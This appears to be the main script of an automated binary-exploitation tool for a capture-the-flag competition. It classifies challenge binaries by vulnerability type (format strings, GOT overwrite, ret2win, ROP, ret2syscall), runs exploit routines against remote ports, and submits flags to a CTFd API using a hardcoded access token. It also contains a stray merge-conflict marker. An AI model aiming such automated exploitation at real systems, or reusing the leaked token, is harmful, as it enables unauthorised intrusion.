import time
import json
import os, subprocess, requests

from dynamic import Dynamic
from static import Static
from exploits import Exploits

# this is the function that will detect what exploit to use and call it 
def handle_exploits(binary, r=None):
    e = Exploits(binary)
    d = Dynamic()
    s = Static()
    
    printf = d.detect_printf_vuln(binary)
    win = False
    libc_leak = None
    syscall = None
    binsh = None

    if printf == "array":
        print("[*] Array abuse detected.")

        flag = e.arrayabuse(binary, _remote=r)

        if not flag:
            pass

        return flag.decode()
        
        
    # printf vulns -- read/write/got overwrite
    if printf == "printf":
        if "pwnme" in e.pwnelf.sym.keys():
            print("[*] Printf write var detected.")

            flag = e.printf_write_var(binary, _remote=r)

            if not flag:
                # kys???
                pass

            return flag.decode()

        if "win" in e.pwnelf.sym.keys():
            print("[*] GOT overwrite detected.")

            vuln = json.loads(e.pipe.cmd("pdfj @ sym.vuln"))
            flag = e.got_overwrite(binary, vuln, _remote=r)

            if not flag:
                # kys again???
                pass

            return flag.decode()


        # printf read
        print("[*] Printf read var detected")

        flag = e.printf_read_var(binary, _remote=r)

        if not flag:
            # angr??
            pass

        return flag.decode()
    
    elif printf == "libc":
        # libc leak -- ret2one
        print("[*] ret2one detected.")
        
        vuln = json.loads(e.pipe.cmd("pdfj @ sym.vuln"))
        libc_leak = s.find_given_leaks(vuln)
        
        flag = e.ret2one(binary, libc_leak, _remote=r)

        if not flag:
            print("[*] Running without a ret")

            flag = e.ret2one(binary, libc_leak, False, _remote=r)

            if not flag:
                print("[*] Trying angr")
                flag = e.ret2one(binary, libc_leak, False, use_angr=True, _remote=r)
            
            if not flag:
                flag = e.ret2one(binary, libc_leak, True, use_angr=True, _remote=r)

        return flag.decode()

    # ret2win -- order might change 
    if "win" in e.pwnelf.sym.keys():
        print("[*] ret2win detected")

        flag = e.ret2win(binary, _remote=r)

        if not flag:
            print("[*] Adding a ret")

            flag = e.ret2win(binary, add_ret=True, _remote=r)

        if not flag:
            # angr
            print("[*] Using angr")

            flag = e.ret2win(binary, use_angr=True, _remote=r)

        if not flag:
            print("[*] Using angr and adding a ret")

            flag = e.ret2win(binary, use_angr=True, add_ret=True, _remote=r)

        return flag.decode()

    # check for "win" in pwnelf.sym -- ret2win/rop params
    if "constrained_win" in e.pwnelf.sym.keys():
        print("[*] ROP Parameters detected")

        constrained_win = json.loads(e.pipe.cmd("pdfj @ sym.constrained_win"))
        flag = e.rop_parameters(binary, constrained_win, _remote=r)

        if not flag:
            print("[*] Using a ret")

            flag = e.rop_parameters(binary, constrained_win, add_ret=True, _remote=r)

        if not flag:
            # angr
            print("[*] Using angr")

            flag = e.rop_parameters(binary, constrained_win, use_angr=True, _remote=r)

        if not flag:
            print("[*] Using angr and a ret")

            flag = e.rop_parameters(binary, constrained_win, use_angr=True, add_ret=True, _remote=r)

        return flag.decode()


        # check for "execve" in pwnelf.plt -- ret2execve
    if "execve" in e.pwnelf.plt.keys():
        print("[*] ret2execve detected.")
        
        flag = e.ret2execve(binary, _remote=r)

        if not flag:
            print("[*] Using angr")
            flag = e.ret2execve(binary, use_angr=True, _remote=r)

        return flag.decode()
    
    try:
        binsh = next(e.pwnelf.search(b"/bin/sh"))

    except:
        pass
    
    try:
        binsh = next(e.pwnelf.search(b"cat flag.txt"))

    except:
        pass
    


    # check for "system" in pwnelf.plt -- ret2system or write gadgets
    if "system" in e.pwnelf.plt.keys() and binsh:
        print("[*] ret2system detected.")

        flag = e.ret2system(binary, _remote=r)

        if not flag:
            # run without ret and then angr!!
            print("[*] Running without a ret")

            flag = e.ret2system(binary, _remote=r)

        if not flag:
            print("[*] Using angr")

            flag = e.ret2system(binary, use_angr=True, _remote=r)

        return flag.decode()

    elif "system" in e.pwnelf.plt.keys():
        print("[*] Write gadgets detected.")

        flag = e.write_gadgets(binary, _remote=r)

        if not flag:
            print("[*] Trying with a ret")

            flag = e.write_gadgets(binary, add_ret=True, _remote=r)

        if not flag:
            # bruh
            pass

        return flag.decode()

    # syscall gadget -- ret2syscall
    for file, gadget in e.rs.search(search="syscall"):
        if "syscall;" in str(gadget):
            syscall = int(str(gadget).split(":")[0], 16)
            break

    
    if syscall:
        print("[*] ret2syscall detected.")

        flag = e.ret2syscall(binary, syscall, _remote=r)

        if not flag:
            print("[*] Shortening ROP chain 1.")

            flag = e.ret2syscall(binary, syscall, 1, _remote=r)

        if not flag:
            print("[*] Shortening ROP chain 2.")

            flag = e.ret2syscall(binary, syscall, 2, _remote=r)

        if not flag:
            print("[*] Shortening ROP chain 3.")

            flag = e.ret2syscall(binary, syscall, 3, _remote=r)

        return flag.decode()
    
    
    print("[!] Exploit detection error! Returning None.")

    return None

# ================ TESTING GROUNDS ===================

def test_category(category):
    bins = [ f"{category}-{i}" for i in range(10) ]
    count = 0
    start = time.time()
    failed = []

    #flag = handle_exploits(bins[2])

    for binary in bins:
        print("========== " + binary)
        #flag = handle_exploits(binary)
        
        try:
            flag = handle_exploits(binary)

            if flag == "flag{your_mom_is_very_beautiful_to_me}":
                count += 1

            else:
                failed.append(binary)

        except:
            failed.append(binary)
            pass

    end = time.time()
    print(failed)
    print(f"==== Test conclusion: {count}/10 in {round(end - start, 2)} seconds. ====")

    return [count, round(end - start, 2)]
    #print(flags)

def deep_test():
    categories = [
        "bin-arrayabuse",
        "bin-got-overwrite",
        "bin-printf-read-var",
        "bin-printf-write-var",
        "bin-ret2execve",
        "bin-ret2one",
        "bin-ret2syscall",
        "bin-ret2system",
        "bin-ret2win",
        "bin-rop-parameters",
        "bin-write-gadgets"
    ]

    results = []
    total = [0, 0]

    for cat in categories:
        try:
            alice = test_category(cat)
            total[0] += alice[0]
            total[1] += alice[1]
            results.append(alice)

        except:
            print("Error in " + cat)
            results.append([-1, -1])

    print("================ RESULTS ================\n")
    for i in range(len(categories)):
        print(f"{categories[i]}: {results[i][0]}/10 in {results[i][1]} seconds.")

    print(f"\nTotal: {total[0]}/110 in {total[1]} seconds (or {round(total[1] / 60, 2)} minutes).\n")
    print("=========================================")


def logo():
    alice = '''

<<<<<<< Updated upstream

                                       ...............
                                       ...............
                                       ...=#####*=....
                                       ....=#******#+.
                                       ....-**********#=............
                                       ....-*************#:..........
                                       ....#**************##-........
                                       ..-*******************#-......
                                       .=*********************##:...
                                       :#**********************##*...
                                    ...+*********************######....
                                ... ...********************########%.... .
                                .......=*****************############......
                                ........=***************#############:......
                                ....+*#**************################+......
                                .-#***************###################=...... ..
                         ......:#***************####################%............
                         .....#**************#####################%######=.........
                         ...:##***********#########################********#+......
                         ..:#**#*****#########################%##***********##+...
                         ..#################################%#***************###..
                         ..#############################%%#****************#####%..
                         ..##########################%##****************#########:.
                  ... .....%####*=:-:::---+#########*************+--::::-:-+#####-........
                  .........:%#*:::::....::::=##****************+:::::::::::::+###:........
                  .. .......:=::.:...:....::::****************-::::..:......::-%%.........
                  ......:###-::...:@@@@@=....::**************::...::@@@@@-....:-+=:.......
             .. .....=#****+::...@@@@@@@@@....:-************=:....@@@@@@@@%....:-****##..........
           .    ...-*******::...+@@@@@@@@@@....:+*******####::...*@@@@@@@@@#....:******##.... ...
          ........#********:....%@@@@@@@@@@:...:=***#######*:....@@@@@@@@@@@:...:+*****###......
          .......**********:....@@@@@@@@@@@-...:=##########*:....@@@@@@@@@@@:...:+****#####.....
           .....-#*********:....%@@@@@@@@@@:...:+##########*:....@@@@@@@@@@@....:**########+.....
           .....*#*********:....=@@@@@@@@@%....:*##########%:....+@@@@@@@@@*....:###########.. ..
           .....*########**+:....+@@@@@@@%.....-############+:....+@@@@@@@#....:=##########%.. ..
           .....*###########=:.....*@@@%: . .::##%%####******-......*@@@#.....:-###########%:. ..
           .....:############=:..............:%###************-:..............-#############.....
          .......+%############::.........::+*******************::.........::*#############*.....
          ........-%#%###%%%%####-:.:::::-***********************#-::::.:.-################+.......
          ....=##*#***#******************************************####*##################*#****%:....
    ......:##************************************************##########################********##*......
    ....:##*************************+++++++++++++++++++++++++++++++++++*#############**********#*##*...
    ...*#**************************+===----------------------------=====##########************######%:..
    ..##****************************=-:::::::::::::::::::::::::::::::-=#########************##########:.
    .=##*****************************#=::.........................::-*########*************############.
    .#####*#*******************#########*-:.....................::=########*************###############+
    =######################################*=::..............:-+#######***************#################*
    *############################################*==---==+*#########****************##################%=
    -###########################################################******************#####################.
    .######################################################********************######################%-.
    ..@%###############################################**********************########################=..
    ...=%#########################################***********************##########################%:...
    .....:%%##################################*#*********************###########################%#=....
    .........-##%############%%###+-:-=++***********#####################################%#%##=.........
    ..................................................................................................
    ............................................................................................. ... ..

    '''

    bob = '''
    
    \t\t\t~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    \t\t\t~                                                 ~
    \t\t\t~       ____     ____         _        ____       ~
    \t\t\t~      / ___|   |  _ \       / \      |  _ \      ~
    \t\t\t~     | |       | |_) |     / _ \     | |_) |     ~
    \t\t\t~     | |___ _  |  _ < _   / ___ \ _  |  __/      ~
    \t\t\t~      \____(_) |_| \_(_) /_/   \_(_) |_|         ~
    \t\t\t~                                                 ~
    \t\t\t~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    '''

    print(alice)
    print(bob)

#test_category("bin-rop-parameters")
#deep_test()

#flag = handle_exploits("./ace-student/test-bins/bin-ret2win-0")
#flag = handle_exploits("./ace-student/test-bins/bin-rop-parameters-0")
#print(flag)

# Access token for team to make api calls -- CHANGE THIS
access_token = "ctfd_696f91a00fc32938c5ce7238c8328be2bd3d577933baf1b5844d64593a1e22eb"

# URL of ctfd --
ctfd_url = "https://ctfd.fitsec.monster"

# Headers needed for api calls
headers = {
    "Authorization": f"Token {access_token}",
    "Content-Type" : "application/json",
}

flag_pattern = r'flag\{[^}]+\}'

# ------------------------------------------------- #
# This is where your auto exploit code should be    #
# placed. This should craft the exploit locally to  #
# get the fake flag, send the exploit to the remote #
# binary, receive the flag, and submit the flag     #
# ------------------------------------------------- #

if __name__ == "__main__":
    logo()

    # ----- Download Binary Repo ----- #
    while(1):
        try:
            subprocess.run("git clone https://github.com/password987654321/ace-student.git", shell=True)
            os.chdir("ace-student/comp-bins") # CHANGE THIS EVENTUALLY
            break
        except Exception as e:
            print("Failed to clone git repo!")
    # -------------------------------- #

    if not os.path.isfile("./flag.txt"):
        with open("flag.txt", "w") as f:
            f.write("flag{your_mom_is_very_beautiful_to_me}")

    # ----- Get the first chal id ---- #
    challenge_url = f"{ctfd_url}/api/v1/challenges"
    response = requests.get(challenge_url, headers=headers)
    json_data = json.loads(response.text).get("data", {})
    challenge_list = {i["name"]: int(i["id"]) for i in json_data}
    # -------------------------------- #

    challenge_url = f"{ctfd_url}/api/v1/challenges/attempt"

    filenames = os.listdir()
    for file in filenames:
        if ".txt" not in file and ".py" not in file and ".gdb" not in file:
            if "_patched" not in file:
                subprocess.run(f"pwninit --bin {file} --libc ../libc.so.6 --ld ../ld-2.27.so --no-template && mv {file}_patched {file}", shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    
    # breh
    port_count = 20000
    challenges = sorted(os.listdir())
    flags = []
    start = time.time()

    for challenge in challenges:
        if challenge == 'flag.txt':
            break

        flag = "FLAG"
        flag = challenge
        print(f"=============== {challenge}")

        for i in range(10):
            flag = handle_exploits(challenge, ["fitsec.monster", port_count])
            try:
                flag = handle_exploits(challenge, ["fitsec.monster", port_count])
                break

            except:
                pass
            
        port_count += 1
        flag = flag.strip()
        flags.append(flag)
    # ----- Main Execution Loop! ----- #
        data = json.dumps({"challenge_id" : challenge_list[challenge], "submission" : flag})
        response = requests.post(challenge_url, headers=headers, data=data)

    end = time.time()
    count = 0

    print(flags)
    for alice in flags:
        if "flag{" not in alice:
            count += 1
            print(alice)
    
    print(f"==== Conclusion: {120 - count}/120 in {round(end - start, 2)} seconds (or {round((end - start) / 60, 2)} minutes). ====")

